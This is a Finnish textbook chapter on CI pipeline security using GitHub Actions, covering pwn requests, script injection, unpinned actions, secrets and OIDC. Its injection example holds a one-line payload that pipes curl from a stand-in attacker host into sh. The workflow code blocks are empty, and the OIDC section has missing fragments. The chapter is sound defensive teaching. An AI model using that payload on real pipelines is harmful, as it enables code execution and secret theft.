# CI:n turvallisuus

CI-putki on organisaation etuoikeutetuin järjestelmä: se lukee
lähdekoodin, sillä on julkaisuavaimet ja usein pääsy tuotantoon, ja se
ajaa koodia, jota kuka tahansa voi ehdottaa pull requestilla. Monet
viime vuosien toimitusketjun hyökkäyksistä on tehty CI:n kautta. Tämä
luku käyttää esimerkkinä GitHub Actionsia, mutta samat periaatteet
koskevat GitLab CI:tä, Jenkinsiä ja muita.

## Työnkulun vaaralliset mallit

Alla oleva työnkulku vastaa pull requesteihin ja kommentteihin. Se
näyttää harmittomalta, mutta siinä on neljä yleistä virhettä:

```{.yaml tiedosto="esimerkit/09-vaarallinen.yml"}
```

1. **`pull_request_target`** ajaa työnkulun pohjarepositorion
   kontekstissa: salaisuudet ja kirjoitusoikeinen token ovat
   käytettävissä myös forkista tulevalle pull requestille. Kun työnkulku
   lisäksi hakee pull requestin koodin (`ref: ...head.sha`) ja ajaa sen
   (`make testaa`), kuka tahansa voi ajaa omaa koodiaan salaisuuksien
   kanssa. Tämä yhdistelmä tunnetaan nimellä *pwn request*.
2. **Skriptin injektio.** `${{ ... }}`-lauseke korvataan tekstinä ennen
   kuin komentotulkki näkee skriptin. Kommentti `"; curl
   hyokkaaja.example | sh; "` muuttuu osaksi komentoa.
3. **Kiinnittämättömät toiminnot.** `@v4` on tagi, jonka toiminnon
   ylläpitäjä (tai kaappaaja) voi siirtää osoittamaan uuteen koodiin.
   Maaliskuussa 2025 `tj-actions/changed-files`-toiminnon tagit
   siirrettiin osoittamaan koodiin, joka tulosti salaisuudet ajolokiin.
4. **Ei `permissions`-osiota.** Tokenin oikeudet tulevat organisaation
   oletuksista, jotka voivat olla kirjoitusoikeudet kaikkeen.

Korjattu versio:

```{.yaml tiedosto="esimerkit/09-korjattu.yml"}
```

Lauseke välitetään ympäristömuuttujana (`env:`), jolloin komentotulkki
näkee sen datana eikä koodina. Oikeudet ovat oletuksena vain luku, ja
yksittäinen työ saa juuri tarvitsemansa. Toiminto on kiinnitetty commitin
tiivisteeseen, jota ei voi siirtää.

## Salaisuudet CI:ssä

CI-alustan salaisuusvarasto antaa arvot ajolle ja peittää ne lokeista,
mutta peitto on viimeinen puolustuslinja eikä estä tarkoituksellista
vuotoa (base64-koodattu salaisuus ei peity). Periaatteet:

- **Salaisuudet vain niille töille, jotka niitä tarvitsevat.** Ympäristöt
  (*environments*) rajaavat salaisuudet tiettyihin haaroihin ja vaativat
  tarvittaessa hyväksynnän.
- **Ei salaisuuksia forkien pull requesteille.** `pull_request`-tapahtuma
  ei anna niitä, eikä sitä pidä kiertää.
- **Ei pysyviä pilviavaimia.** OIDC korvaa ne.

## OIDC: pilvioikeudet ilman tallennettua avainta

mikä repositorio, haara, ympäristö ja työnkulku ajoa suorittaa.
Pilvipalvelu (AWS, Azure, Google Cloud, Vault) vaihtaa tunnisteen
väliaikaisiin tunnuksiin, jos **luottamusehto** täsmää. OIDC (*OpenID
Connect*) on sama protokolla, jolla käyttäjät kirjautuvat palveluihin
kolmannen osapuolen tunnuksilla; tässä kirjautuja on CI-ajo.

ajon maailmassa.

## Build-ympäristö

- **Isännöidyt ajokoneet ovat kertakäyttöisiä.** Itse ylläpidetty
  ajokone, joka ajaa julkisen repositorion pull requesteja, antaa
  vieraalle koodille pysyvän jalansijan verkon sisällä. Itse ylläpidetyt
  ajokoneet vain yksityisille repositorioille ja mieluiten
  kertakäyttöisinä.
- **Välimuistit ovat syöte.** Välimuistiin kirjoittava pull request voi
  myrkyttää sen päähaaran ajoille; välimuistit erotellaan haaroittain.
- **Julkaisu omassa työssään.** Testit ja build ilman salaisuuksia,
  julkaisu erillisessä työssä, joka saa vain julkaisuoikeuden ja ajetaan
  vain suojatusta haarasta tai tagista.

## Käytännössä

- **`permissions: contents: read` oletukseksi** ja lisäoikeudet
  työkohtaisesti.
- **Lausekkeet ympäristömuuttujiksi.** `${{ }}` ei koskaan suoraan
  `run`-lohkoon, kun arvo voi tulla käyttäjältä.
- **Ei `pull_request_target` + vieras koodi.** Jos tapahtumaa tarvitaan
  (esimerkiksi merkintöjen lisäämiseen), työnkulku ei hae eikä aja pull
  requestin koodia.
- **Toiminnot kiinnitettyinä tiivisteisiin** ja päivitykset
  automaattisina pull requesteina.
- **OIDC tiukoin ehdoin** pysyvien pilviavainten sijaan.
- **Työnkulkujen linteri CI:ssä** (actionlint, zizmor).

## Itsearviointi

- Osaat tunnistaa pwn request -mallin, skriptin injektion ja
  kiinnittämättömät toiminnot työnkulusta ja korjata ne.
- Osaat rajata työnkulun tokenin oikeudet ja salaisuudet.
- Osaat selittää OIDC-luottamuksen ja kirjoittaa riittävän tiukan
  luottamusehdon.
- Osaat järjestää build- ja julkaisuvaiheet niin, että vieras koodi ei
  pääse julkaisuoikeuksiin.
